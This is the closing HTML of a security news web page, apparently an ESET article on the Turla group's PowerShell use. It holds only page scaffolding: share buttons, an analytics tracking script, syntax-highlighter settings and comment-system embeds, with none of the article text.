			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F29%2Fturla-powershell-usage%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F29%2Fturla-powershell-usage%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F29%2Fturla-powershell-usage%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.2.0.adc7d1ec.pro-awus -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"126039 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=126039","disqusShortname":"welivesecurity","disqusTitle":"A dive into Turla PowerShell usage","disqusUrl":"https:\/\/www.welivesecurity.com\/2019\/05\/29\/turla-powershell-usage\/","postId":"126039"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>